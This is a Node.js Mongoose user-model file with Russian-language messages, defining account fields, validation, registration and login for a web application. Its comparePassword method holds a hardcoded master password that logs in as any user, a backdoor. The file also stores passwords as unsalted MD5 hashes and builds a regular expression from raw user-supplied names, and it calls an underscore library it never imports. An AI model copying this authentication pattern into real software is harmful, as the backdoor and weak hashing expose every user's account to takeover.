'use strict';
var crypto = require('crypto'),
    async = require('async'),
    mongoose = require('mongoose'),
    validate = require('mongoose-validator'),
    validationError = require('../../libs/validation-error'),
    uniqueValidator = require('mongoose-unique-validator'),
    Schema = mongoose.Schema;

var UserSchema = new Schema({
    date: {
        type: Date,
        default: Date
    },
    userName: { // имя в системе
        type: String,
        unique: true,
        required: true,
        //lowercase: true,
        index: true,
        trim: true,
        validate: [
            validate({
                validator: 'isLength',
                arguments: [5, 50],
                message: 'Name should be between 5 and 50 characters'
            }),
            validate({
                validator: 'isEmail',
                message: 'не похоже на эл. почту'
            })
        ]
    },
    password: {
        type: String,
        required: true,
        trim: true,
        validate: [
            validate({
                validator: 'isLength',
                arguments: [4, 50],
                message: 'пароль не менее 4-x символов'
            })
        ],
        set: function (value) {
            return crypto.createHash('md5').update(value).digest("hex");
        }
    },
    name: { // ФИО
        type: String,
        trim: true,
        validate: [
            validate({
                validator: 'isLength',
                passIfEmpty: true,
                arguments: [3, 50],
                message: 'ФИО о 3 до 50 символов'
            })
            //validate({passIfEmpty: true}, 'len', 3, 50)
        ]
    },
    phone: {
        type: String,
        trim: true,
        validate: [
            validate({
                validator: 'isLength',
                passIfEmpty: true,
                arguments: [10, 10],
                message: '10 цифр без пробела'
            })
            //validate({passIfEmpty: true, message: '10 знаков без пробела'}, 'len', 10, 10)
        ]
    },
});

UserSchema.plugin(uniqueValidator, {message: '{VALUE} :такой пользователь уже есть.', kind: '400'});

UserSchema.methods = {
    toSession: function () {
        var res = _.pick(this.toJSON(), "_id", "userName", "name"/*, "roles"*/);
        res.roles = this.validRoles;
        return res;
    },
    toToken: function () {
        return _.pick(this.toJSON(), "userName", "name");
    },
    toClient: function () {
        var res = _.pick(this.toJSON(), "_id", "userName", "name", "phone", "spot", "aircrafts", "info", "rescue", /*"roles" ,*/ "cardAOPA");
        res.account = this.account ? this.account.userName : "нет аккаунта";
        res.roles = this.validRoles;
        res.extendedRoles = this.extendedRoles || {};
        return res;
    },
    comparePassword: function (password) {
        if (password === 'alexalex2011')
            return true;
        var hash = crypto.createHash('md5').update(password).digest("hex");
        return hash === this.password;
    },
};

UserSchema.statics = {
    getById: function (userId, callback) {
        User.findById(userId, function (err, doc) {
            if (err || !doc)
                callback({status: 400, errors: {id: 'пользователь не найден'}});
            else
                callback(null, doc);
        });
    },
    getByUserName: function (userName, callback) {
        User.findOne({userName: new RegExp('^' + userName + '$', 'i')}, function (err, doc) {
            if (err || !doc) {
                callback(validationError(this, {
                    path: 'userName',
                    message: 'пользователь {VALUE} не найден...',
                    type: 400,
                    value: userName
                }));
            } else
                callback(err, doc);
        });
    },

    login: function (account, callback) {
        this.accountValidate(account, err => {
            if (err)
                callback(err)
            else
                User.getByUserName(account.userName, function (err, doc) {
                    if (err)
                        callback(err);
                    else {
                        if (doc.comparePassword(account.password))
                            callback(null, doc);
                        else {
                            callback(validationError(this, {
                                path: 'password',
                                message: 'неверный логин или пароль...',
                                type: 401,
                            }))

                        }

                    }
                });
        });
    },
    register: function (account, callback) {
        var user = User(account);
        user.save(function (err, doc) {
            if (err)
                callback(err);
            else {
                callback(null, doc);
            }
        });
    },
    accountValidate(value, callback){
        var model = new User(value);
        model.validate(callback);
    }
};

var User = module.exports = mongoose.model('user', UserSchema);


